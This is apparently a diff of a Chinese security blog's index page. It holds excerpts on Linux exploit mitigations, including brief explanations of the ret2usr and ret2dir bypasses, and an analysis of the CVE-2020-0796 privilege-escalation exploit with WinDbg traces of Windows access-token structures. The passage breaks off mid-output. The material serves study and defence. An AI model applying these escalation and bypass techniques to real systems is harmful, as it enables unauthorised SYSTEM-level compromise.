-<h3 id="2-9-内核地址空间布局随机化-Kernel-Address-Space-Layout-Randomisation"><a href="#2-9-内核地址空间布局随机化-Kernel-Address-Space-Layout-Randomisation" class="headerlink" title="2.9 内核地址空间布局随机化(Kernel Address Space Layout Randomisation)"></a>2.9 内核地址空间布局随机化(Kernel Address Space Layout Randomisation)</h3><p>内核地址空间布局随机化（kASLR）旨在通过随机化内核的基地址来使某些内核利用更加难以实现。依赖于内核符号位置的漏洞利用必须发现随机基址。</p>
-<p>kASLR从Ubuntu 14.10开始可用，但默认情况下未启用。 在内核命令行上指定“ kaslr”选项以使用kASLR。</p>
-<p>注意：启用kASLR将会禁用休眠模式。</p>
-<h3 id="2-10-冷门协议黑名单-Blacklist-Rare-Protocols"><a href="#2-10-冷门协议黑名单-Blacklist-Rare-Protocols" class="headerlink" title="2.10 冷门协议黑名单(Blacklist Rare Protocols)"></a>2.10 冷门协议黑名单(Blacklist Rare Protocols)</h3><p>通常，内核允许通过MODULE_ALIAS_NETPROTO（PF _…）宏按需自动加载所有网络协议。由于这些协议中的许多协议对于旧版Ubuntu用户来说都是旧的，稀有的或通常很少使用的，并且可能包含未发现的可利用漏洞，因此自Ubuntu 11.04起，它们已被列入黑名单。 其中包括：ax25，netrom，x25，rose，decnet，econet，rds和af_802154。 如果需要任何协议，则可以通过modprobe专门加载它们，或者可以更新/etc/modprobe.d/blacklist-rare-network.conf文件以删除黑名单条目。</p>
-<h3 id="2-11-过滤系统调用-Syscall-Filtering"><a href="#2-11-过滤系统调用-Syscall-Filtering" class="headerlink" title="2.11 过滤系统调用(Syscall Filtering)"></a>2.11 过滤系统调用(Syscall Filtering)</h3><p>程序可以使用seccomp_filter接口过滤掉内核syscall的可用性。 这是在容器或沙箱中完成的，这些容器或沙箱希望在潜在运行不受信任的软件时进一步限制对内核接口的访问。</p>
-<p>seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp安全机制能使一个进程进入到一种“安全”运行模式，该模式下的进程只能调用4种系统调用（system call），即 read(), write(), exit() 和 sigreturn()，否则进程便会被终止。</p>
-<p>CTF中的seccomp详见：</p>
-<p><a href="https://www.jianshu.com/p/969219ce9050" target="_blank" rel="noopener">https://www.jianshu.com/p/969219ce9050</a></p>
-<p><a href="https://blog.csdn.net/tan6600/article/details/80967853" target="_blank" rel="noopener">https://blog.csdn.net/tan6600/article/details/80967853</a></p>
-<h3 id="2-12-限制dmesg-dmesg-restrictions"><a href="#2-12-限制dmesg-dmesg-restrictions" class="headerlink" title="2.12 限制dmesg(dmesg restrictions)"></a>2.12 限制dmesg(dmesg restrictions)</h3><p>当攻击者试图开发通用性更强的漏洞利用程序时，他们经常会使用dmesg输出。通过将dmesg输出视为敏感信息，攻击者无法使用此输出。从Ubuntu 12.04 LTS开始，可以将/ proc / sys / kernel / dmesg_restrict设置为“ 1”，以将dmesg输出视为敏感内容。 Ubuntu Touch内核默认情况下启用了此功能。</p>
-<h3 id="2-13-禁止kexec-Block-kexec"><a href="#2-13-禁止kexec-Block-kexec" class="headerlink" title="2.13 禁止kexec(Block kexec)"></a>2.13 禁止kexec(Block kexec)</h3><p>从Ubuntu 14.04 LTS开始，现在可以通过sysctl禁用kexec。在Ubuntu中启用了CONFIG_KEXEC，因此最终用户可以根据需要使用kexec，新的sysctl允许管理员禁用kexec_load。 例如，这在设置CONFIG_STRICT_DEVMEM和modules_disabled的环境中是理想的。</p>
-<h3 id="2-14-UEFI安全启动-UEFI-Secure-Boot"><a href="#2-14-UEFI安全启动-UEFI-Secure-Boot" class="headerlink" title="2.14 UEFI安全启动(UEFI Secure Boot)"></a>2.14 UEFI安全启动(UEFI Secure Boot)</h3><p>从Ubuntu 12.04 LTS开始，UEFI安全启动在引导加载程序的强制模式和内核的非强制模式下实现。 使用此配置，无法验证的内核将只能在未启用UEFI兼容模式(quirks)下启动。Ubuntu 18.04 LTS的Ubuntu 18.04.2版本为引导加载程序和内核启用了强制模式，因此验证失败的内核不会启动，而且验证失败的内核模块也不会加载。 </p>
-<h3 id="2-15-内核页表隔离-Kernel-PageTable-Isolation"><a href="#2-15-内核页表隔离-Kernel-PageTable-Isolation" class="headerlink" title="2.15 内核页表隔离(Kernel PageTable Isolation)"></a>2.15 内核页表隔离(Kernel PageTable Isolation)</h3><p>今年年初的CPU漏洞让内核页表隔离(KPTI, Kernel PageTable Isolation)进入了人们的视野。进程地址空间被分成了内核地址空间和用户地址空间，其中内核地址空间映射到了整个物理地址空间，而用户地址空间只能映射到指定的物理地址空间。内核地址空间和用户地址空间共用一个页全局目录表。为了彻底防止用户程序获取内核数据，可以令内核地址空间和用户地址空间使用两组页表集。linux内核从4.15开始支持KPTI，windows上把这个叫KVA Shadow，原理类似。更多细节请见参考资料。</p>
-<h3 id="2-16-SMAP-SMEP"><a href="#2-16-SMAP-SMEP" class="headerlink" title="2.16 SMAP/SMEP"></a>2.16 SMAP/SMEP</h3><p>SMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode Execution Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege Execute Never)和PAN(Privileged Access Never)。SMEP类似于前面说的NX，不过一个是在内核态中，一个是在用户态中。和NX一样SMAP/SMEP需要处理器支持，可以通过cat /proc/cpuinfo查看，在内核命令行中添加nosmap和nosmep禁用。windows系统从win8开始启用SMEP，windows内核枚举哪些处理器的特性可用，当它看到处理器支持SMEP时通过在CR4寄存器中设置适当的位来表示应该强制执行SMEP，可以通过ROP或者jmp到一个RWX的内核地址绕过。linux内核从3.0开始支持SMEP，3.7开始支持SMAP。</p>
-<p>在没有SMAP/SMEP的情况下把内核指针重定向到用户空间的漏洞利用方式被称为ret2usr。physmap是内核管理的一块非常大的连续的虚拟内存空间，为了提高效率，该空间地址和RAM地址直接映射。RAM相对physmap要小得多，导致了任何一个RAM地址都可以在physmap中找到其对应的虚拟内存地址。另一方面，我们知道用户空间的虚拟内存也会映射到RAM。这就存在两个虚拟内存地址(一个在physmap地址，一个在用户空间地址)映射到同一个RAM地址的情况。也就是说，我们在用户空间里创建的数据，代码很有可能映射到physmap空间。基于这个理论在用户空间用mmap()把提权代码映射到内存，然后再在physmap里找到其对应的副本，修改EIP跳到副本执行就可以了。因为physmap本身就是在内核空间里，所以SMAP/SMEP都不会发挥作用。这种漏洞利用方式叫ret2dir。</p>
-<h2 id="3-checksec"><a href="#3-checksec" class="headerlink" title="3 checksec"></a>3 checksec</h2><p>Checksec是一个用于检查可执行文件的正在使用的标准Linux OS或PaX的安全特性（例如PIE，RELRO，PaX，Canaries，ASLR，Fortify Source）的bash脚本。 它最初是由<a href="http://www.trapkit.de/tools/checksec.html" target="_blank" rel="noopener">Tobias Klein</a>编写，自2011年的v1.5版本之后，不再维护。新版本来自github.com/slimm609/的<a href="[https://github.com/slimm609/checksec.sh/](https://github.com/slimm609/checksec.sh/)">开源项目</a>。</p>
-<p>[^PaX]: PaX是针对Linux Kernel的一个加固版本的补丁，它让Linux内核的内存页受限于最小权限原则，是一个”有效防御系统级别0DAY”的方案。</p>
-<p>checksec的使用方法：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$checksec --file&#x3D;&#x2F;bin&#x2F;ls</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   &#x2F;bin&#x2F;ls</span><br></pre></td></tr></table></figure>
-
-<p>一般来说，也可以使用gdb中peda插件自带的checksec功能，如下图所示：</p>
-<p><img src="/2020/04/28/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/%E5%9B%BE-1.png" alt="图 1"></p>
-<p>上图所示的<font color="red"><strong>CANARY: disabled</strong></font>表示没有开启栈保护特性。</p>
-<h2 id="4-参考和引用"><a href="#4-参考和引用" class="headerlink" title="4 参考和引用"></a>4 参考和引用</h2><p><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
-<p><a href="https://www.infoq.cn/article/Linux-PaX-Grsecurity/" target="_blank" rel="noopener">https://www.infoq.cn/article/Linux-PaX-Grsecurity/</a></p>
-<p><a href="https://blog.csdn.net/zsj2102/article/details/78734981" target="_blank" rel="noopener">https://blog.csdn.net/zsj2102/article/details/78734981</a></p>
-<p><a href="https://bbs.pediy.com/thread-226696.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-226696.htm</a></p>
-<p><a href="https://wiki.ubuntu.com/Security/Features" target="_blank" rel="noopener">https://wiki.ubuntu.com/Security/Features</a></p>
-<p><a href="https://manybutfinite.com/post/anatomy-of-a-program-in-memory/" target="_blank" rel="noopener">https://manybutfinite.com/post/anatomy-of-a-program-in-memory/</a></p>
-
+          <p>现代Linux发行版提供了一些缓解技术，使更难稳定利用软件漏洞。例如只读重定位(RELRO，RELocation Read-Only)，禁止执行(NX，NoExecute)，栈保护(Canaries)，地址空间布局随机化(ASLR，Address Space Layout Randomization)和位置无关可执行文件(PIE，Position Independent Executables)之类的缓解措施，已经使稳定利已知漏洞的挑战的更加困难。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/04/28/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E7%BC%BA%E9%99%B7%E7%BC%93%E8%A7%A3%E6%9C%BA%E5%88%B6/">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -374,13 +249,6 @@
 
               <time title="创建时间：2020-04-21 08:00:00" itemprop="dateCreated datePublished" datetime="2020-04-21T08:00:00+08:00">2020-04-21</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-05-05 23:25:41" itemprop="dateModified" datetime="2020-05-05T23:25:41+08:00">2020-05-05</time>
-              </span>
 
           
 
@@ -393,158 +261,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="漏洞利用视角下的CVE-2020-0796漏洞"><a href="#漏洞利用视角下的CVE-2020-0796漏洞" class="headerlink" title="漏洞利用视角下的CVE-2020-0796漏洞"></a>漏洞利用视角下的CVE-2020-0796漏洞</h1><h2 id="1-概述"><a href="#1-概述" class="headerlink" title="1 概述"></a>1 概述</h2><p>初见是惊鸿一瞥，重逢是始料未及。</p>
-<p>各位“蓝颜知己”我们又见面了，本文是《漏洞分析视角下的CVE-2020-0796漏洞》的兄弟篇。CVE-2020-796漏洞成因已经在前文说明，这次我们从漏洞利用视角来看看CVE-2020-796漏洞。</p>
-<p>这次我们分析对象是github.com/danigargu上的本地权限提升(LPE，Local Privilege Escalation)利用(Exploit)。</p>
-<p>LPE的exploit是以C++源码形式提供的，这也有便于我们分析exploit开发原理。我们可以用Microsoft Visual Studio编译它。然后以非管理员身份运行cmd程序，执行编译后的文件cve-2020-07960local.exe。如图1所示：</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-1.jpg" alt="img"></p>
-<center>图1</center>
-
-<p>在exploit执行前后的whoami命令显示用户名并未改变。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-2.jpg" alt="img"></p>
-<center>图2</center>
-
-<p>如图2所示，而是新弹出一个cmd的界面，在其中执行whoami显示用户名已经被修改为nt authority\system</p>
-<p>幸亏本文标题不是《漏洞复现视角下的CVE-2020-0796漏洞》，不然本文就到此为止了。由此可见选一个好标题的重要性，来让我们看看，这一闪而显的黑窗口背后发生了什么。</p>
-<h2 id="2-一串神奇的数字"><a href="#2-一串神奇的数字" class="headerlink" title="2 一串神奇的数字"></a>2 一串神奇的数字</h2><p>使用之前分析工作中的断点，查看</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bp srv2!Srv2DecompressData+0x108 &quot;.printf \&quot;srv2!memmove(Src&#x3D;0x%I64x, Dst&#x3D;0x%I64x,Size&#x3D;%d) \n\&quot;, rdx, rcx, r8d;db rdx;.echo&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">srv2!memmove(Src&#x3D;0xffffc68fe8ee2840, Dst&#x3D;0xffff8d8dec51e0a0,Size&#x3D;16)</span><br><span class="line"></span><br><span class="line">kd&gt; r</span><br><span class="line">rax&#x3D;ffffc68fe8ee2540 rbx&#x3D;ffffc68fea74c150 rcx&#x3D;ffff8d8dec51e0a0</span><br><span class="line">rdx&#x3D;ffffc68fe8ee2840 rsi&#x3D;0000000000000010 rdi&#x3D;ffffc68fe8ee22c0</span><br><span class="line">rip&#x3D;fffff80fae8a7f68 rsp&#x3D;fffff2013002ee70 rbp&#x3D;0000000000000002</span><br><span class="line"> r8&#x3D;0000000000000010 r9&#x3D;ffffc68fea9012a0 r10&#x3D;ffffc68fe7e02160</span><br><span class="line">r11&#x3D;fffff2013002ee50 r12&#x3D;0000000000000000 r13&#x3D;ffffc68fec5ff240</span><br><span class="line">r14&#x3D;00000000ffffffff r15&#x3D;0000000000000000</span><br><span class="line">iopl&#x3D;0     nv up ei ng nz na pe nc</span><br><span class="line">cs&#x3D;0010 ss&#x3D;0018 ds&#x3D;002b es&#x3D;002b fs&#x3D;0053 gs&#x3D;002b       efl&#x3D;00000282</span><br><span class="line">srv2!Srv2DecompressData+0x108:</span><br><span class="line">fffff80f&#96;ae8a7f68 e85376ffff   call  srv2!memcpy (fffff80f&#96;ae89f5c0)</span><br></pre></td></tr></table></figure>
-
-<p>目的地址内存：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db 0xffff8d8dec51e0a0 L0n16</span><br><span class="line">ffff8d8d&#96;ec51e0a0 00 00 88 02 06 00 00 00-00 00 80 00 00 00 00 00 ................</span><br></pre></td></tr></table></figure>
-
-<p>源地址内存：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; db 0xffffc68fe8ee2840 L0n16</span><br><span class="line">ffffc68f&#96;e8ee2840 bc ff ff f2 1f 00 00 00-bc ff ff f2 1f 00 00 00 ................</span><br></pre></td></tr></table></figure>
-
-<p>这个Exploit要从一个特定的地址读16字节的数据，然后再写入另一个特定的地方去。</p>
-<p>根据前文的分析，此处memmove的函数，是要把数据流头部未压缩的数据，移动过来，完成预定的解压缩业务流程。</p>
-<p><img src="/2020/04/21/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84CVE-2020-0796%E6%BC%8F%E6%B4%9E/%E5%9B%BE-3.jpg" alt="img"></p>
-<center>图3</center>
-
-<p>如图3所示，从我们抓到的流量数据来看，offset大小与memmove的size，以及数据和数据的确能匹配上。</p>
-<p>我们要搞明白这个来自网络流中，现在是memmove的源地址存放的数据，对这个特定目的地址来说有什么特别的意义。</p>
-<p>一番眼花缭乱的操作之后，“我不再是我”。我们需要额外了解一些关于Windows内核提权的小技巧。</p>
-<p>这是一个在虚拟世界中如何向Windows“证明你自己是你自己”的问题。和现实世界中“大内侍卫凌凌漆的腰牌”有些类似。</p>
-<h2 id="3-进程的访问令牌"><a href="#3-进程的访问令牌" class="headerlink" title="3 进程的访问令牌"></a>3 进程的访问令牌</h2><p>微软文档中关于访问令牌（Access Token，原文详见引用2）的描述如下：</p>
-<p>访问令牌是一个描述进程或线程的安全上下文的对象。令牌中的信息包括与进程或线程关联的用户帐号的标识和特权。当用户登录时，系统通过将用户密码与安全数据库中存储的信息进行比较来验证用户密码。如果密码通过了验证，则系统将生成一个访问令牌。 以该用户名义执行的每个进程都有此访问令牌的副本。</p>
-<p>当线程与安全对象进行交互或尝试执行需要特权的系统任务时，系统使用访问令牌来标识用户。 访问令牌包含以下信息：</p>
-<p>·     用户帐号的<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/security-identifiers" target="_blank" rel="noopener">安全标识符</a>（SID）<br>·     用户所属的组的SID<br>·     标识当前登录会话的登录SID<br>·     用户或用户组拥有的<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privileges" target="_blank" rel="noopener">特权</a>列表<br>·     所有者SID<br>·     主要组（primary group）的SID<br>·     用户创建安全对象而没有指定<a href="https://docs.microsoft.com/windows/desktop/SecGloss/s-gly" target="_blank" rel="noopener"><em>安全描述符</em></a>时，系统使用的默认<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/access-control-lists" target="_blank" rel="noopener">DACL</a><br>·     访问令牌的来源<br>·     令牌是<a href="https://docs.microsoft.com/windows/desktop/SecGloss/p-gly" target="_blank" rel="noopener">主</a>令牌(<a href="https://docs.microsoft.com/windows/desktop/SecGloss/p-gly" target="_blank" rel="noopener"><em>primary</em></a> token）还是<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation" target="_blank" rel="noopener">模拟</a>令牌（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/client-impersonation" target="_blank" rel="noopener">impersonation</a> token）<br>·     <a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens" target="_blank" rel="noopener">限制SID</a>（<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/restricted-tokens" target="_blank" rel="noopener">restricting SIDs</a>）的可选列表<br>·     当前的模拟级别<br>·     其他统计信息</p>
-<p>每个进程都有一个主要令牌，用于描述与该进程关联的用户帐号的安全上下文。 默认情况下，当进程的线程与安全对象进行交互时，系统将使用主令牌。 此外，线程可以模拟当事人帐号（client account）。 模拟允许线程使用当事人的安全上下文与安全对象进行交互。 模拟当事人的线程同时具有主令牌和模拟令牌。</p>
-<h2 id="4-ATT-amp-CK中的访问令牌操纵攻击技术"><a href="#4-ATT-amp-CK中的访问令牌操纵攻击技术" class="headerlink" title="4 ATT&amp;CK中的访问令牌操纵攻击技术"></a>4 ATT&amp;CK中的访问令牌操纵攻击技术</h2><p>MITRE ATT&amp;CK®是一个基于真实世界的观察对手的战术和技术的可全球访问的知识库。ATT＆CK知识库被用作在私营部门、政府以及网络安全产品和服务社区中开发特定威胁模型和方法的基础。</p>
-<p>在权限提升（<a href="https://attack.mitre.org/tactics/TA0004/" target="_blank" rel="noopener">Privilege Escalation</a>）一节中的访问令牌操纵（<a href="https://attack.mitre.org/techniques/T1134" target="_blank" rel="noopener">Access Token Manipulation</a>）详细介绍了在Windows系统中通过如何操纵访问令牌来提升权限的技巧。</p>
-<p>Windows使用访问令牌来确定正在运行的进程的所有权。用户可以操纵访问令牌以使正在运行的进程看起来像它属于启动该进程的用户以外的其他人。发生这种情况时，该进程还将采用与新令牌关联的安全上下文。例如，Microsoft提倡使用访问令牌作为最佳安全实践。管理员应以标准用户身份登录，通过内置的访问令牌操作命令runas，以管理员特权运行其工具。</p>
-<p>攻击者可以使用访问令牌在不同的用户或系统安全上下文下进行操作，并逃避检测。对手可以使用内置的Windows API函数来复制现有进程中的访问令牌；这被称为令牌窃取。对手必须已经在特权用户上下文（即管理员）中才能窃取令牌。但是，攻击者通常使用令牌窃取来将其安全上下文从管理员级别提升到SYSTEM级别。如果帐户在远程系统上具有适当的权限，则对手可以使用令牌作为该令牌的帐户向远程系统进行身份验证。</p>
-<h2 id="5-手动修改访问令牌"><a href="#5-手动修改访问令牌" class="headerlink" title="5 手动修改访问令牌"></a>5 手动修改访问令牌</h2><p>我们了解到Windows识别进程的身份靠的就是这个令牌。在Windows中应用态的内存可被进程任意读写，为了更好地安全性，Windows把令牌（token）的放进了内核态。</p>
-<p>先看其中一个手动修改方法：</p>
-<p>WinDBG中的!process扩展命令会显示指定进程或者全部进程的EPROCESS块信息。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !process 0 0 System</span><br><span class="line">PROCESS ffff980dd646a380</span><br><span class="line">  SessionId: none Cid: 0004  Peb: 00000000 ParentCid: 0000</span><br><span class="line">  DirBase: 001ad002 ObjectTable: ffffd5872c604b80 HandleCount: 2203.</span><br><span class="line">  Image: System</span><br></pre></td></tr></table></figure>
-
-<p>其中的PROCESS ffff980dd646a380即表示System进程的EPROCESS的内存地址是0x ffff980dd646a380。</p>
-<p>可使用dt _EPROCESS指令查看0x ffff980dd646a380地址处的EPROCESS块信息：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EPROCESS ffff980dd646a380</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">  +0x000 Pcb       : _KPROCESS</span><br><span class="line">  +0x2e0 ProcessLock   : _EX_PUSH_LOCK</span><br><span class="line">  +0x2e8 UniqueProcessId : 0x00000000&#96;00000004 Void</span><br><span class="line">  +0x2f0 ActiveProcessLinks : _LIST_ENTRY [ 0xffff980d&#96;d64d2370 - 0xfffff804&#96;6ece1bc0 ]</span><br><span class="line">  +0x300 RundownProtect  : _EX_RUNDOWN_REF</span><br><span class="line">..</span><br><span class="line">  +0x360 Token      : _EX_FAST_REF</span><br><span class="line">..</span><br></pre></td></tr></table></figure>
-
-<p>EPROCESS是较大的结构体，我们省略了部分，重点关注0x360偏移处的这个Token结构。该结构是一个_EX_FAST_REF类型。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dt _EX_FAST_REF</span><br><span class="line">nt!_EX_FAST_REF</span><br><span class="line">  +0x000 Object      : Ptr64 Void</span><br><span class="line">  +0x000 RefCnt      : Pos 0, 4 Bits</span><br><span class="line">  +0x000 Value      : Uint8B</span><br></pre></td></tr></table></figure>
-
-<p>观察_EX_FAST_REF字段定义可知，0~4bit是引用计数，其余bit位才是value。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; dq ffff980dd646a380+0x360 L1</span><br><span class="line">ffff980d&#96;d646a6e0 ffffd587&#96;2c60604f</span><br></pre></td></tr></table></figure>
-
-<p>一般会通过位与法获得最终的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; ? ffffd587&#96;2c60604f &amp; ffffffff&#96;fffffff0</span><br><span class="line">Evaluate expression: -46698434895808 &#x3D; ffffd587&#96;2c606040</span><br></pre></td></tr></table></figure>
-
-<p>可使用!token扩展指令查看令牌的具体结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">kd&gt; !token ffffd587&#96;2c606040</span><br><span class="line">_TOKEN 0xffffd5872c606040</span><br><span class="line">TS Session ID: 0</span><br><span class="line">User: S-1-5-18</span><br><span class="line">User Groups: </span><br><span class="line"> 00 S-1-5-32-544  Attributes - Default Enabled Owner </span><br><span class="line"> 01 S-1-1-0  Attributes - Mandatory Default Enabled </span><br><span class="line"> 02 S-1-5-11  Attributes - Mandatory Default Enabled </span><br><span class="line"> 03 S-1-16-16384  Attributes - GroupIntegrity GroupIntegrityEnabled </span><br><span class="line"></span><br><span class="line">Primary Group: S-1-5-18</span><br><span class="line"></span><br><span class="line">Privs: </span><br><span class="line"> 02 0x000000002 SeCreateTokenPrivilege      Attributes - </span><br><span class="line"> 03 0x000000003 SeAssignPrimaryTokenPrivilege   Attributes - </span><br><span class="line"> 04 0x000000004 SeLockMemoryPrivilege       Attributes - Enabled Default </span><br><span class="line"> 05 0x000000005 SeIncreaseQuotaPrivilege     Attributes - </span><br><span class="line"> 07 0x000000007 SeTcbPrivilege          Attributes - Enabled Default </span><br><span class="line"> 08 0x000000008 SeSecurityPrivilege        Attributes - </span><br><span class="line"> 09 0x000000009 SeTakeOwnershipPrivilege     Attributes - </span><br><span class="line"> 10 0x00000000a SeLoadDriverPrivilege       Attributes - </span><br><span class="line"> 11 0x00000000b SeSystemProfilePrivilege     Attributes - Enabled Default </span><br><span class="line"> 12 0x00000000c SeSystemtimePrivilege       Attributes - </span><br><span class="line"> 13 0x00000000d SeProfileSingleProcessPrivilege  Attributes - Enabled Default </span><br><span class="line"> 14 0x00000000e SeIncreaseBasePriorityPrivilege  Attributes - Enabled Default </span><br><span class="line"> 15 0x00000000f SeCreatePagefilePrivilege     Attributes - Enabled Default </span><br><span class="line"> 16 0x000000010 SeCreatePermanentPrivilege    Attributes - Enabled Default </span><br><span class="line"> 17 0x000000011 SeBackupPrivilege         Attributes - </span><br><span class="line"> 18 0x000000012 SeRestorePrivilege        Attributes - </span><br><span class="line"> 19 0x000000013 SeShutdownPrivilege        Attributes - </span><br><span class="line"> 20 0x000000014 SeDebugPrivilege         Attributes - Enabled Default </span><br><span class="line"> 21 0x000000015 SeAuditPrivilege         Attributes - Enabled Default </span><br><span class="line"> 22 0x000000016 SeSystemEnvironmentPrivilege   Attributes - </span><br><span class="line"> 23 0x000000017 SeChangeNotifyPrivilege      Attributes - Enabled Default </span><br><span class="line"> 25 0x000000019 SeUndockPrivilege         Attributes - </span><br><span class="line"> 28 0x00000001c SeManageVolumePrivilege      Attributes - </span><br><span class="line"> 29 0x00000001d SeImpersonatePrivilege      Attributes - Enabled Default </span><br><span class="line"> 30 0x00000001e SeCreateGlobalPrivilege      Attributes - Enabled Default </span><br><span class="line"> 31 0x00000001f SeTrustedCredManAccessPrivilege  Attributes - </span><br><span class="line"> 32 0x000000020 SeRelabelPrivilege        Attributes - </span><br><span class="line"> 33 0x000000021 SeIncreaseWorkingSetPrivilege   Attributes - Enabled Default </span><br><span class="line"> 34 0x000000022 SeTimeZonePrivilege        Attributes - Enabled Default </span><br><span class="line"> 35 0x000000023 SeCreateSymbolicLinkPrivilege   Attributes - Enabled Default </span><br><span class="line"> 36 0x000000024 SeDelegateSessionUserImpersonatePrivilege Attributes - Enabled Default </span><br><span class="line"></span><br><span class="line">Authentication ID:     (0,3e7)</span><br><span class="line">Impersonation Level:    Anonymous</span><br><span class="line">TokenType:         Primary</span><br><span class="line">Source: *SYSTEM*      TokenFlags: 0x2000 ( Token in use )</span><br><span class="line">Token ID: 3eb       ParentToken ID: 0</span><br><span class="line">Modified ID:        (0, 3ec)</span><br><span class="line">RestrictedSidCount: 0   RestrictedSids: 0x0000000000000000</span><br><span class="line">OriginatingLogonSession: 0</span><br><span class="line">PackageSid: (null)</span><br><span 